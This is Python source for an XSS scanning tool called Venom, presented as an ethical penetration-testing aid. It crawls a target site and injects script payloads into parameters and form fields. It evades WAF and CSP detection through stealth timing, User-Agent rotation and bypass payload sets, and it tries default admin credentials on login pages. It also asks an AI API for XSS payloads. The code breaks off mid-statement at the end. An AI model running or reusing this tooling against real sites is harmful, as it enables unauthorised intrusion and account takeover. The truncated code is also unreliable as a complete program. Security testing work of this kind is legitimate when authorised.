#!/usr/bin/env python3
import requests
import sys
import re
import os
import time
import argparse
import threading
import queue
import random
from urllib.parse import urljoin, urlencode, urlparse, parse_qs
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import logging
from typing import Optional, List, Dict
import html
from requests.exceptions import RequestException, SSLError, Timeout
from concurrent.futures import ThreadPoolExecutor

# Setup logging
log_file = "venom.log"
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(log_file, mode='a', encoding='utf-8'), logging.StreamHandler()]
)
logging.info("Logging initialized successfully")

# Colors
RED, GREEN, YELLOW, RESET, BOLD, WHITE = '\033[91m', '\033[92m', '\033[93m', '\033[0m', '\033[1m', '\033[97m'
ORANGE = '\033[38;5;208m'

# Thread-safe counter
class ThreadSafeCounter:
    def __init__(self):
        self.value = 0
        self.lock = threading.Lock()

    def increment(self):
        with self.lock:
            self.value += 1
            return self.value

    def get(self):
        with self.lock:
            return self.value

def sanitize_input(input_str: str) -> str:
    return re.sub(r'[;&|><`]', '', input_str)

def sanitize_path(path: str) -> str:
    return os.path.abspath(os.path.normpath(path))

def get_banner_and_features() -> str:
    banner = f"""
{GREEN}╔════════════════════════════════════════════════════════════════════╗{RESET}
{GREEN}║          ██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗           ║{RESET}
{GREEN}║          ██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║           ║{RESET}
{GREEN}║          ██║   ██║█████╗  ██╔██╗ ██║██║   ██╗██╔████╔██║           ║{RESET}
{GREEN}║          ██║   ██║██╔══╝  ██║╚██╗██║██║   ██╗██║╚██╔╝██║           ║{RESET}
{GREEN}║          ╚██████╔╝███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║           ║{RESET}
{GREEN}║           ╚═════╝ ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝           ║{RESET}
{GREEN}║                                                                    ║{RESET}
{GREEN}║                  Venom Advanced XSS Scanner 2025                   ║{RESET}
{GREEN}║                            Version 5.18                            ║{RESET}
{GREEN}║    Made by: YANIV AVISROR | PENETRATION TESTER | ETHICAL HACKER    ║{RESET}
{GREEN}╚════════════════════════════════════════════════════════════════════╝{RESET}
"""
    features = [
        "Accurate XSS detection with context-aware analysis",
        "Session-aware POST/GET scanning with login support",
        "Dynamic response analysis for improved detection",
        "WAF/CSP detection with adaptive strategies",
        "Payloads sourced from local files and GitHub",
        "AI-driven payload optimization with model selection",
        "Stealth mode with dynamic adjustments"
    ]
    return banner + "\nCore Features:\n" + "\n".join(f"{GREEN}➤ {feature}{RESET}" for feature in features) + "\n"

def parse_args() -> argparse.Namespace:
    banner_and_features = get_banner_and_features()
    description = f"""{banner_and_features}
Venom Advanced XSS Scanner is a professional-grade tool for ethical penetration testers to identify XSS vulnerabilities with high accuracy. This version supports HTTP/HTTPS, POST/GET requests, login page scanning, and AI model selection.

Usage:
  python3 venom.py <url> [options]

Arguments:
  url                   Target URL to scan (e.g., https://example.com)

Options:
  -h, --help            Show this help message and exit
  -w, --workers         Number of concurrent threads (default: 5, capped at 2 in stealth mode)
  --ai-assist           Enable AI-driven payload optimization (requires --ai-key)
  --ai-key              API key for AI assistance (e.g., xAI key)
  --ai-model            AI model to use (e.g., 'xai-grok', 'openai-gpt3', default: 'xai-grok')
  --scan-xss            Enable XSS scanning (required)
  --payloads-dir        Directory with custom payload files (default: ./payloads/)
  --timeout             HTTP request timeout in seconds (default: 10)
  --verbose             Enable detailed logging for diagnostics
  --stealth             Force stealth mode (default: auto-detected based on WAF)
  --min-delay           Min delay between tests in seconds (default: auto-adjusted)
  --max-delay           Max delay between tests in seconds (default: auto-adjusted)
  --full-report         Show all vulnerabilities in report (default: first 10)
  -H                    Custom HTTP headers (e.g., -H 'Cookie: sessionid=xyz')
  --method              HTTP method to use (default: both, options: get, post, both)
  --data                Data for POST request in 'key=value&key2=value2' format
  --payload-field       Field to inject payload into (e.g., 'password')
  --login-url           URL for login to establish session (optional)
  --login-data          Login credentials in 'key=value&key2=value2' format (optional)
  --auto-login          Automatically detect and scan login pages (default: False)
"""
    
    parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("url", help="Target URL to scan")
    parser.add_argument("-w", "--workers", type=int, default=5, help="Number of concurrent threads")
    parser.add_argument("--ai-assist", action="store_true", help="Enable AI-driven payload optimization")
    parser.add_argument("--ai-key", type=str, default=None, help="API key for AI assistance")
    parser.add_argument("--ai-model", type=str, default="xai-grok", help="AI model to use")
    parser.add_argument("--scan-xss", action="store_true", help="Enable XSS scanning (required)", required=True)
    parser.add_argument("--payloads-dir", default="./payloads/", help="Directory with custom payload files")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP request timeout in seconds")
    parser.add_argument("--verbose", action="store_true", help="Enable detailed logging")
    parser.add_argument("--stealth", action="store_true", help="Force stealth mode", default=False)
    parser.add_argument("--min-delay", type=float, help="Min delay between tests in seconds")
    parser.add_argument("--max-delay", type=float, help="Max delay between tests in seconds")
    parser.add_argument("--full-report", action="store_true", help="Show all vulnerabilities in report")
    parser.add_argument("-H", action='append', help="Custom HTTP headers", default=[])
    parser.add_argument("--method", choices=['get', 'post', 'both'], default='both', help="HTTP method to use")
    parser.add_argument("--data", type=str, default=None, help="Data for POST request")
    parser.add_argument("--payload-field", type=str, default=None, help="Field to inject payload into")
    parser.add_argument("--login-url", type=str, default=None, help="URL for login to establish session")
    parser.add_argument("--login-data", type=str, default=None, help="Login credentials for POST")
    parser.add_argument("--auto-login", action="store_true", help="Automatically detect and scan login pages", default=False)

    print(banner_and_features)
    while True:
        response = input(f"{RED}[!] Ethical use only (YES/NO): {RESET}").strip().upper()
        if response == "YES":
            print(f"{GREEN}[+] Ethical use confirmed. Initiating scan...{RESET}")
            break
        elif response == "NO":
            print(f"{RED}[!] This tool is for ethical use only. Exiting.{RESET}")
            sys.exit(0)
        else:
            print(f"{YELLOW}[!] Please enter YES or NO.{RESET}")

    args = parser.parse_args()
    args.payloads_dir = sanitize_path(args.payloads_dir)
    if args.stealth:
        args.workers = min(args.workers, 2)
        args.min_delay = args.min_delay if args.min_delay is not None else 5
        args.max_delay = args.max_delay if args.max_delay is not None else 15
        print(f"{GREEN}[+] Stealth mode forced: Workers limited to {args.workers}, Delays: {args.min_delay}-{args.max_delay}s{RESET}")
    else:
        args.min_delay = args.min_delay if args.min_delay is not None else 0.1
        args.max_delay = args.max_delay if args.max_delay is not None else 0.5
    if args.ai_assist and not args.ai_key:
        print(f"{YELLOW}[!] Warning: --ai-assist enabled without --ai-key. Using default payload enhancement.{RESET}")
    if args.method == 'post' and not args.data and not args.auto_login:
        print(f"{YELLOW}[!] Warning: POST method selected without --data or --auto-login. No data will be sent unless forms are detected.{RESET}")
    if args.login_url and not args.login_data:
        print(f"{RED}[!] Error: --login-url provided without --login-data. Exiting.{RESET}")
        sys.exit(1)
    command = " ".join(sys.argv)
    print(f"{GREEN}[+] Command executed: {command}{RESET}")
    return args

def fetch_payloads_from_github(urls: List[str], timeout: int) -> List[str]:
    payloads = []
    headers = {'User-Agent': 'Venom-XSS-Scanner/5.18'}
    session = requests.Session()
    session.mount('https://', HTTPAdapter(max_retries=Retry(total=5, backoff_factor=2)))
    for url in urls:
        try:
            response = session.get(url, headers=headers, timeout=timeout, verify=True)
            response.raise_for_status()
            content = response.text
            extracted = re.findall(r'`([^`]+)`', content)
            payloads.extend([sanitize_input(p.strip()) for p in extracted if p.strip() and '<' in p])
            logging.info(f"Fetched {len(extracted)} payloads from {url}")
        except (RequestException, SSLError, Timeout) as e:
            logging.error(f"Failed to fetch payloads from {url}: {e}")
    return payloads

class PayloadGenerator:
    def __init__(self, payloads_dir: str, bypass_needed: bool = False, use_403_bypass: bool = False, stealth: bool = False):
        self.payloads_dir = payloads_dir
        self.bypass_needed = bypass_needed
        self.use_403_bypass = use_403_bypass
        self.stealth = stealth
        self.payloads = self.load_payloads()

    def load_payloads(self) -> List[str]:
        default_payloads = [
            "<script>alert('venom')</script>",
            "<img src=x onerror=alert('venom')>",
            "<svg onload=alert('venom')>",
            "<script>console.log('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS\")'>",
            "<body onload=alert('XSS')>",
            "\"><script>alert(1)</script>",
            "javascript:alert('XSS')"
        ]
        stealth_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
        ]
        
        payloads = []
        if not os.path.exists(self.payloads_dir):
            logging.warning(f"Payloads directory {self.payloads_dir} not found; using defaults.")
            return stealth_payloads if self.stealth else default_payloads

        category_map = {
            'waf_bypass': 'waf_bypass.txt',
            '403bypass': '403bypass.txt',
            'default': ['advanced_xss.txt', 'xss_payloads.txt', 'basic_xss.txt']
        }

        selected_category = 'waf_bypass' if self.bypass_needed else '403bypass' if self.use_403_bypass else 'default'
        all_files = [f for f in os.listdir(self.payloads_dir) if f.endswith('.txt')]
        if not all_files:
            logging.warning(f"No .txt files found in {self.payloads_dir}; using defaults.")
            return stealth_payloads if self.stealth else default_payloads

        if selected_category == 'default':
            for filename in category_map['default']:
                file_path = os.path.join(self.payloads_dir, filename)
                if os.path.exists(file_path):
                    with open(file_path, 'r', encoding='utf-8') as f:
                        payloads.extend(sanitize_input(line.strip()) for line in f if line.strip())
                    logging.info(f"Loaded default payloads from {file_path}")
        else:
            file_path = os.path.join(self.payloads_dir, category_map[selected_category])
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    payloads.extend(sanitize_input(line.strip()) for line in f if line.strip())
                logging.info(f"Loaded {selected_category} payloads from {file_path}")
            else:
                logging.warning(f"No {selected_category} file found; falling back to all .txt files.")
                for filename in all_files:
                    file_path = os.path.join(self.payloads_dir, filename)
                    with open(file_path, 'r', encoding='utf-8') as f:
                        payloads.extend(sanitize_input(line.strip()) for line in f if line.strip())
                    logging.info(f"Loaded payloads from {file_path}")

        if not self.stealth:
            github_urls = [
                "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md",
                "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/2%20-%20XSS%20Polyglot.md"
            ]
            github_payloads = fetch_payloads_from_github(github_urls, 15)
            payloads.extend(github_payloads)

        if not payloads:
            payloads = stealth_payloads if self.stealth else default_payloads
        
        logging.info(f"Loaded {len(payloads)} total payloads (local + GitHub)")
        return list(set(payloads))

    def optimize_payloads(self, response_text: str, active_params: List[str]) -> List[str]:
        html_context = '<input' in response_text or '<form' in response_text or '<body' in response_text
        js_context = '<script' in response_text or 'javascript:' in response_text
        optimized = []
        for payload in self.payloads:
            if len(payload) > 100:
                continue
            if html_context and ('on' in payload.lower() or 'src=' in payload.lower() or '>' in payload or 'background' in payload.lower()):
                optimized.append(payload)
            elif js_context and ('alert(' in payload.lower() or 'console.log(' in payload.lower() or 'javascript:' in payload.lower()):
                optimized.append(payload)
            elif '<script' in payload or '<iframe' in payload or '<meta' in payload:
                optimized.append(payload)
        return optimized[:50] if optimized else self.payloads[:50]

    def generate(self) -> List[str]:
        return self.payloads

class AIAssistant:
    def __init__(self, payloads: List[str], api_key: Optional[str] = None, model: str = "xai-grok"):
        self.payloads = payloads
        self.api_key = api_key
        self.model = model
        self.api_endpoint = self.get_api_endpoint()
        self.success_history: Dict[str, dict] = {}
        self.lock = threading.Lock()
        if self.api_key and self.api_endpoint:
            logging.info(f"AI assistance enabled with model: {self.model}, endpoint: {self.api_endpoint}")
        else:
            logging.info("AI assistance disabled (no API key or invalid model). Using default enhancement.")

    def get_api_endpoint(self) -> Optional[str]:
        endpoints = {
            "xai-grok": "https://api.xai.com/completions",
            "openai-gpt3": "https://api.openai.com/v1/completions"
        }
        return endpoints.get(self.model, None)

    def suggest_payloads(self, response: Optional[str] = None, initial_run: bool = False, status_code: int = 200) -> List[str]:
        executable_payloads = [p for p in self.payloads if 'alert(' in p.lower() or 'on' in p.lower() or 'javascript:' in p.lower()]
        other_payloads = [p for p in self.payloads if p not in executable_payloads]
        
        if status_code == 404 or "timed out" in str(response).lower():
            executable_payloads = sorted(executable_payloads, key=len)[:10]
            logging.info("Prioritizing shorter payloads due to timeouts or 404s.")
        
        if initial_run or not self.success_history:
            if self.api_key and self.api_endpoint and response:
                ai_suggestions = self.get_ai_suggestions(response)
                executable_payloads.extend(ai_suggestions)
                logging.info(f"AI-enhanced payload set generated with {self.model}: {len(ai_suggestions)} additional payloads.")
            return list(set(executable_payloads + other_payloads[:20]))
        
        if response and self.api_key and self.api_endpoint:
            context = 'html' if '<' in response else 'js' if 'script' in response.lower() else 'unknown'
            with self.lock:
                sorted_payloads = sorted(
                    executable_payloads,
                    key=lambda p: self.success_history.get(p, {"weight": 0.0})["weight"],
                    reverse=True
                )
            ai_suggestions = self.get_ai_suggestions(response)
            sorted_payloads.extend(ai_suggestions)
            sorted_payloads.extend(other_payloads[:20])
            return list(set(sorted_payloads))
        
        return list(set(executable_payloads + other_payloads[:20]))

    def get_ai_suggestions(self, response: str) -> List[str]:
        try:
            headers = {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/json"}
            data = {
                "prompt": f"Suggest optimized XSS payloads for this web response:\n{response[:500]}",
                "max_tokens": 50,
                "model": self.model if self.model == "openai-gpt3" else None
            }
            ai_response = requests.post(self.api_endpoint, json=data, headers=headers, timeout=10, verify=True)
            ai_response.raise_for_status()
            if self.model == "xai-grok":
                suggestions = ai_response.json().get("choices", [{}])[0].get("text", "").splitlines()
            else:
                suggestions = ai_response.json().get("choices", [{}])[0].get("text", "").splitlines()
            return [sanitize_input(s.strip()) for s in suggestions if s.strip() and '<' in s]
        except (RequestException, ValueError) as e:
            logging.error(f"AI API call failed for {self.model}: {e}")
            return []

    def record_success(self, payload: str, context: str = "unknown", status_code: int = 200) -> None:
        with self.lock:
            if payload not in self.success_history:
                self.success_history[payload] = {"success_count": 0, "weight": 0.0, "context": context}
            if status_code == 200:
                self.success_history[payload]["success_count"] += 1
                self.success_history[payload]["weight"] = min(1.0, self.success_history[payload]["weight"] + 0.2)

class Venom:
    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.session = requests.Session()
        self.session.mount('http://', HTTPAdapter(max_retries=Retry(total=5, backoff_factor=2), pool_maxsize=200))
        self.session.mount('https://', HTTPAdapter(max_retries=Retry(total=5, backoff_factor=2), pool_maxsize=200))
        self.session.headers.update({
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15'
            ]),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.google.com/',
            'Content-Type': 'application/x-www-form-urlencoded'
        })

        if args.H:
            for header in args.H:
                try:
                    key, value = header.split(':', 1)
                    self.session.headers.update({sanitize_input(key.strip()): sanitize_input(value.strip())})
                except ValueError:
                    logging.warning(f"Invalid header format: {header}")

        self.post_data = {}
        if args.data:
            for pair in args.data.split('&'):
                key, value = pair.split('=', 1)
                self.post_data[key] = value

        if args.login_url and args.login_data:
            self.establish_session(args.login_url, args.login_data)

        self.task_queue = queue.Queue()
        self.lock = threading.Lock()
        self.vulnerabilities = []
        self.visited_urls = set()
        self.total_tests = ThreadSafeCounter()
        self.total_payloads = 0
        self.current_payload = "Initializing..."
        self.start_time = time.time()
        self.running = True
        self.domain = urlparse(args.url).netloc
        self.waf_csp_status = "Unknown"
        self.bypass_performed = False
        self.use_403_bypass = False
        self.is_waf_detected = False
        self.active_params = []

        self.initial_waf_csp_check()
        if not self.args.stealth and self.is_waf_detected:
            self.args.min_delay = 5
            self.args.max_delay = 15
            self.args.workers = min(self.args.workers, 2)
            print(f"{YELLOW}[!] WAF detected. Enabling stealth mode: Delays {self.args.min_delay}-{self.args.max_delay}s, Workers: {self.args.workers}{RESET}")
        self.payload_generator = PayloadGenerator(self.args.payloads_dir, self.bypass_performed, self.use_403_bypass, self.args.stealth or self.is_waf_detected)
        self.payloads = self.payload_generator.generate()
        self.total_payloads = len(self.payloads)
        self.ai_assistant = AIAssistant(self.payloads, self.args.ai_key, self.args.ai_model) if self.args.ai_assist else None
        print(f"{GREEN}[+] AI Assistance: {'Enabled' if self.ai_assistant and self.args.ai_key else 'Disabled'}{RESET}")

    def establish_session(self, login_url: str, login_data: str) -> None:
        login_dict = {}
        for pair in login_data.split('&'):
            key, value = pair.split('=', 1)
            login_dict[key] = value
        try:
            login_response = self.session.post(login_url, data=login_dict, timeout=self.args.timeout, verify=True)
            if login_response.status_code in [200, 302]:
                logging.info(f"Login successful to {login_url}")
            else:
                logging.warning(f"Login failed to {login_url} (Status: {login_response.status_code})")
        except RequestException as e:
            logging.error(f"Login attempt failed: {e}")

    def initial_waf_csp_check(self) -> None:
        try:
            response = self.session.get(self.args.url, timeout=self.args.timeout, verify=True)
            headers = response.headers
            waf_indicators = {'cloudflare': 'cf-ray', 'akamai': 'akamai', 'sucuri': 'sucuri', 'mod_security': 'mod_security'}
            csp = headers.get('Content-Security-Policy', '')
            for tech, indicator in waf_indicators.items():
                if indicator.lower() in str(headers).lower():
                    self.waf_csp_status = f"WAF detected ({tech})"
                    self.is_waf_detected = True
                    logging.info(f"Initial check: WAF detected: {tech}")
                    break
            if not self.is_waf_detected and csp:
                self.waf_csp_status = "CSP detected"
                self.is_waf_detected = True
                logging.info("Initial check: CSP detected")
            if not self.is_waf_detected:
                self.waf_csp_status = "No WAF/CSP detected"
                logging.info("Initial check: No WAF/CSP detected")
        except RequestException as e:
            logging.error(f"Initial WAF/CSP check failed: {e}")
            self.waf_csp_status = "Check failed"

    def check_connection(self, url: str) -> bool:
        try:
            response = self.session.get(url, timeout=self.args.timeout, allow_redirects=True, verify=True)
            logging.info(f"Connection check for {url}: Status {response.status_code}, Length {len(response.text)}")
            if self.args.verbose:
                logging.info(f"Response content: {response.text[:100]}...")
            return response.status_code < 400 or response.status_code in [403, 404]
        except (RequestException, SSLError, Timeout) as e:
            logging.error(f"Connection check failed for {url}: {e}")
            return False

    def identify_active_params(self, url: str, soup: BeautifulSoup, method: str = 'get') -> List[str]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        param_keys = list(params.keys())
        additional_params = ['q', 'search', 'query', 'id', 'page', 'username', 'password', 'login', 'user', 'pass', 'email']
        for param in additional_params:
            if param not in param_keys:
                param_keys.append(param)
        for tag in soup.find_all(['input', 'textarea', 'select']):
            name = tag.get('name') or tag.get('id')
            if name and name not in param_keys:
                param_keys.append(name)
        
        active_params = []
        try:
            base_response = self.session.request(method, url, timeout=self.args.timeout, verify=True).text
            base_length = len(base_response)
            base_hash = hash(base_response)
            
            for param in param_keys:
                test_params = {param: "test"}
                test_url = f"{url.split('?', 1)[0]}?{urlencode(test_params)}" if method == 'get' else url
                response = self.session.request(
                    method, test_url,
                    params=test_params if method == 'get' else None,
                    data=test_params if method == 'post' else None,
                    timeout=self.args.timeout,
                    verify=True
                ).text
                if len(response) != base_length or hash(response) != base_hash:
                    active_params.append(param)
        except RequestException:
            pass
        
        return active_params if active_params else param_keys

    def detect_login_page(self, url: str, soup: BeautifulSoup) -> Optional[str]:
        login_keywords = ['login', 'signin', 'log-in', 'sign-in', 'auth', 'authenticate']
        if any(keyword in url.lower() for keyword in login_keywords):
            return url
        for form in soup.find_all('form'):
            inputs = form.find_all('input')
            has_username = any('username' in inp.get('name', '').lower() or 'user' in inp.get('name', '').lower() for inp in inputs)
            has_password = any('password' in inp.get('name', '').lower() or 'pass' in inp.get('name', '').lower() for inp in inputs)
            if has_username and has_password:
                action = form.get('action', '')
                return urljoin(url, action) if action else url
        return None

    def auto_login(self, login_url: str) -> bool:
        default_creds = [
            {"username": "admin", "password": "admin"},
            {"username": "user", "password": "password"},
            {"username": "test", "password": "test123"}
        ]
        for creds in default_creds:
            try:
                response = self.session.post(login_url, data=creds, timeout=self.args.timeout, verify=True)
                if response.status_code in [200, 302] and "login" not in response.url.lower():
                    logging.info(f"Auto-login successful to {login_url} with {creds}")
                    return True
            except RequestException as e:
                logging.error(f"Auto-login attempt failed for {login_url}: {e}")
        logging.warning(f"Auto-login failed for {login_url} with default credentials")
        return False

    def calculate_total_tests(self, url: str, soup: BeautifulSoup) -> int:
        self.active_params = self.identify_active_params(url, soup, 'get')
        form_params = sum(len(form.find_all(['input', 'textarea', 'select'])) for form in soup.find_all('form'))
        methods = 2 if self.args.method == 'both' else 1
        return len(self.payloads) * max(len(self.active_params) + form_params, 1) * methods

    def scan(self) -> None:
        logging.info(f"Starting scan on {self.args.url}")
        print(f"{GREEN}[+] Starting XSS scan on {self.args.url}{RESET}")
        if not self.check_connection(self.args.url):
            print(f"{RED}[!] Scan aborted: Target URL is not suitable.{RESET}")
            self.report()
            return
        self.crawl(self.args.url)
        
        with ThreadPoolExecutor(max_workers=self.args.workers) as executor:
            while not self.task_queue.empty() and self.running:
                try:
                    task = self.task_queue.get(timeout=15)
                    executor.submit(task)
                    self.task_queue.task_done()
                    delay = random.uniform(self.args.min_delay, self.args.max_delay)
                    time.sleep(delay)
                except queue.Empty:
                    break
        
        self.running = False
        self._display_status()
        print("\n")
        self.report()

    def crawl(self, url: str, depth: int = 0, max_depth: int = 3) -> None:
        with self.lock:
            if url in self.visited_urls or depth > max_depth or urlparse(url).netloc != self.domain:
                return
            self.visited_urls.add(url)
        try:
            response = self.session.get(url, timeout=self.args.timeout, verify=True)
            if response.status_code == 403 and not self.use_403_bypass:
                self.use_403_bypass = True
                self.payload_generator = PayloadGenerator(self.args.payloads_dir, self.bypass_performed, self.use_403_bypass, True)
                self.payloads = self.payload_generator.generate()
                self.total_payloads = len(self.payloads)
                self.ai_assistant = AIAssistant(self.payloads, self.args.ai_key, self.args.ai_model) if self.args.ai_assist else None
            logging.info(f"Crawled {url}: Status {response.status_code}, Length {len(response.text)}")
            if self.args.verbose:
                logging.info(f"Response content: {response.text[:100]}...")
            soup = BeautifulSoup(response.text, 'html.parser')
            with self.lock:
                self.total_payloads += self.calculate_total_tests(url, soup) - len(self.payloads)
            payloads = self.payload_generator.optimize_payloads(response.text, self.active_params)
            if self.ai_assistant:
                payloads = self.ai_assistant.suggest_payloads(response.text, initial_run=(depth == 0), status_code=response.status_code)
            
            if response.status_code == 404 and len(self.visited_urls) == 1:
                logging.warning(f"Initial URL {url} returned 404. Attempting fallback paths.")
                common_paths = ['/', '/index.php', '/login', '/search']
                for path in common_paths:
                    new_url = urljoin(url, path)
                    if new_url not in self.visited_urls and urlparse(new_url).netloc == self.domain:
                        self.task_queue.put(lambda u=new_url: self.crawl(u, depth + 1, max_depth))
                return
            
            if self.args.method in ['get', 'both']:
                self.test_injection_points(url, response, soup, payloads, 'get')
            if self.args.method in ['post', 'both'] and soup.find_all('form'):
                self.test_injection_points(url, response, soup, payloads, 'post')
            
            for form in soup.find_all('form'):
                action = urljoin(url, form.get('action', ''))
                if urlparse(action).netloc == self.domain:
                    self.task_queue.put(lambda f=form, a=action, p=payloads: self.test_form(a, f, p))
            
            if self.args.auto_login:
                login_url = self.detect_login_page(url, soup)
                if login_url and login_url not in self.visited_urls:
                    if self.auto_login(login_url):
                        self.task_queue.put(lambda u=login_url: self.crawl(u, depth + 1, max_depth))
            
            common_paths = ['/', '/search', '/index.php', '/login']
            for path in common_paths:
                new_url = urljoin(url, path)
                with self.lock:
                    if new_url not in self.visited_urls and urlparse(new_url).netloc == self.domain:
                        self.task_queue.put(lambda u=new_url: self.crawl(u, depth + 1, max_depth))
        except RequestException as e:
            logging.error(f"Crawl failed for {url}: {e}")

    def test_injection_points(self, url: str, response: requests.Response, soup: BeautifulSoup, payloads: List[str], method: str) -> None:
        active_params = self.identify_active_params(url, soup, method)
        logging.info(f"Testing injection points with params: {active_params} on {url} using {method.upper()}")
        base_url = url.split('?', 1)[0]
        base_response = response.text
        base_length = len(base_response)
        base_hash = hash(base_response)
        
        for payload in payloads:
            self.current_payload = payload
            self.total_tests.increment()
            for param in active_params:
                test_params = {param: payload}
                self.task_queue.put(lambda p=param, tp=test_params, pl=payload, m=method, br=base_response, bl=base_length, bh=base_hash: 
                    self.test_request(base_url, tp, pl, m, injection_point=f"Query String ({p})", base_response=br, base_length=bl, base_hash=bh))

    def test_form(self, action: str, form: BeautifulSoup, payloads: List[str]) -> None:
        inputs = {inp.get('name'): inp.get('value', '') for inp in form.find_all(['input', 'textarea', 'select']) if inp.get('name')}
        if not inputs:
            inputs = {tag.get('id') or f"unnamed_{i}": '' for i, tag in enumerate(form.find_all(['input', 'textarea', 'select']))}
        logging.info(f"Testing form inputs: {list(inputs.keys())} on {action}")
        try:
            base_response = self.session.post(action, data=inputs, timeout=self.args.timeout, verify=True).text
            base_length = len(base_response)
            base_hash = hash(base_response)
        except RequestException:
            base_response, base_length, base_hash = "", 0, 0
        
        for name in inputs:
            for payload in payloads:
                self.current_payload = payload
                self.total_tests.increment()
                test_params = inputs.copy()
                if self.args.payload_field and self.args.payload_field in test_params:
                    test_params[self.args.payload_field] = payload
                else:
                    test_params[name] = payload
                self.task_queue.put(lambda n=name, tp=test_params, pl=payload, br=base_response, bl=base_length, bh=base_hash: 
                    self.test_request(action, tp, pl, 'post', injection_point=f"Form Field ({n})", base_response=br, base_length=bl, base_hash=bh))

    def test_request(self, url: str, params: dict, payload: str, method: str = 'get', injection_point: str = 'Unknown', 
                    base_response: str = "", base_length: int = 0, base_hash: int = 0) -> None:
        retry_attempts = 3
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15'
        ]
        
        for attempt in range(retry_attempts):
            try:
                if attempt > 0:
                    self.session.headers['User-Agent'] = random.choice(user_agents)
                    logging.info(f"Retrying {method.upper()} {url} with new User-Agent")
                
                logging.info(f"Testing {method.upper()} {url} with payload: {payload} at {injection_point} (Attempt {attempt+1})")
                data = self.post_data.copy() if method == 'post' else None
                if method == 'post' and params:
                    if self.args.payload_field and self.args.payload_field in data:
                        data[self.args.payload_field] = payload
                    else:
                        data.update(params)
                resp = self.session.request(
                    method, url,
                    params=params if method == 'get' else None,
                    data=data if method == 'post' else None,
                    headers=self.session.headers,
                    timeout=self.args.timeout,
                    verify=True
                )
                status_code = resp.status_code
                
                if status_code in [403, 429] and attempt < retry_attempts - 1:
                    self.use_403_bypass = True
                    self.payload_generator = PayloadGenerator(self.args.payloads_dir, self.bypass_performed, self.use_403_bypass, True)
                    self.payloads = self.payload_generator.generate()
                    self.total_payloads = len(self.payloads)
                    continue
                
                logging.info(f"Response status: {status_code}, length: {len(resp.text)}")
                if self.args.verbose:
                    logging.info(f"Response content: {resp.text[:100]}...")
                full_url = url + ('?' + urlencode(params) if method == 'get' and params else '')
                
                # Dynamic response analysis
                response_text = html.unescape(resp.text.lower())
                response_length = len(resp.text)
                response_hash = hash(resp.text)
                reflected = re.search(re.escape(payload.lower()), response_text) is not None
                
                if not reflected or (response_length == base_length and response_hash == base_hash):
                    break
                
                # Context-aware XSS detection
                soup = BeautifulSoup(resp.text, 'html.parser')
                in_executable_context = False
                escapes_context = False
                
                for tag in soup.find_all(['script', 'iframe', 'meta', 'link', 'body', 'img', 'svg', 'div', 'input']):
                    if tag.name == 'script' and payload.lower() in tag.text.lower():
                        in_executable_context = True
                        break
                    elif tag.name in ['iframe', 'meta', 'link', 'body', 'img', 'svg', 'div', 'input']:
                        attrs = tag.attrs
                        for attr, value in attrs.items():
                            if payload.lower() in str(value).lower() and (attr.startswith('on') or attr in ['src', 'href', 'content']):
                                in_executable_context = True
                                break
                        if in_executable_context:
                            break
                
                in_input_value = False
                for input_tag in soup.find_all('input'):
                    value = str(input_tag.get('value', '')).lower()
                    if payload.lower() in value:
                        in_input_value = True
                        input_str = str(input_tag).lower()
                        post_payload = input_str[input_str.index(payload.lower()) + len(payload):]
                        if '"' in post_payload or '>' in post_payload:
                            escapes_context = True
                        break
                
                if not in_executable_context and not in_input_value:
                    text_nodes = [node.strip().lower() for node in soup.find_all(string=True) if node.strip()]
                    for text in text_nodes:
                        if payload.lower() in text and '<' not in text and '>' not in text:
                            in_executable_context = True
                            break
                
                if reflected and (in_executable_context or (in_input_value and escapes_context)) and payload.strip():
                    severity = "High" if "alert(" in payload.lower() or "on" in payload.lower() or "javascript:" in payload.lower() else "Medium"
                    self.report_vulnerability(full_url, payload, params, f"{injection_point} XSS (Executable, Severity: {severity})", popup=True)
                elif reflected and not in_input_value and not in_executable_context and payload.strip():
                    self.report_vulnerability(full_url, payload, params, f"{injection_point} XSS (Reflected Only, Severity: Low)", popup=False)
                
                self._display_status()
                break
                
            except (RequestException, SSLError, Timeout) as e:
                logging.warning(f"Request failed for {url}: {e} (Attempt {attempt+1})")
                if attempt == retry_attempts - 1:
                    logging.error(f"All {retry_attempts} attempts failed for {url}")

    def _display_status(self) -> None:
        elapsed = int(time.time() - self.start_time)
        progress = (self.total_tests.get() / self.total_payloads * 100) if self.total_payloads else 0
        progress = min(progress, 100.0)
        status = f"{GREEN}╔════ Scan Status ════╗{RESET}\n" \
